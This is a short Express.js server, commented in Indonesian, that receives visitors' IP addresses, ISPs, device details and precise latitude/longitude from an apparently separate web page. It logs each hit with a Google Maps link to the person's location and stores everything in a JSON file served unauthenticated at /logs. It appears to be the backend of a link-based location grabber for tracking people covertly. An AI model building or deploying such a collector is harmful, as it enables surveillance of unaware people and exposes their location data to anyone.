const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
// Update CORS agar lebih permissive untuk debugging
app.use(cors({
    origin: '*', // Allow all origins (Netlify, localhost, etc.)
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type']
}));

app.use(express.json());

// Request logging middleware
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
});

// Endpoint webhook utama
app.post('/log', (req, res) => {
    const hit = {
        ...req.body,
        receivedAt: new Date().toISOString()
    };

    const mapsUrl = `https://www.google.com/maps?q=${hit.lat},${hit.lon}`;

    // Format Log agar mudah dibaca di Railway
    console.log(`
🔔 DATA MASUK BARU!
---------------------------------------------------------------
📱 DEVICE   : ${hit.ua}
💻 LAYAR    : ${hit.screen}
📍 LOKASI   : ${hit.city}, ${hit.region}, ${hit.country}
🌐 IP       : ${hit.ip}
🏢 ISP      : ${hit.isp}

� KLIK LINK DI BAWAH UNTUK LIHAT LOKASI 👇
${mapsUrl}
---------------------------------------------------------------
    `);

    // Save ke file JSON
    const logFile = path.join(__dirname, 'logs', 'hits.json');
    const logs = fs.existsSync(logFile) ? JSON.parse(fs.readFileSync(logFile)) : [];
    logs.unshift(hit);
    fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));

    res.json({ status: 'ok' });
});

// Endpoint geolocation
app.post('/geo', (req, res) => {
    console.log('📍 GEO:', req.body);
    res.json({ status: 'ok' });
});

// View logs via browser
app.get('/logs', (req, res) => {
    const logFile = path.join(__dirname, 'logs', 'hits.json');
    const logs = fs.existsSync(logFile) ? JSON.parse(fs.readFileSync(logFile)) : [];
    res.json(logs);
});

app.listen(3000, () => {
    console.log('🚀 Server running on http://localhost:3000');
    console.log('📊 Logs: http://localhost:3000/logs');
});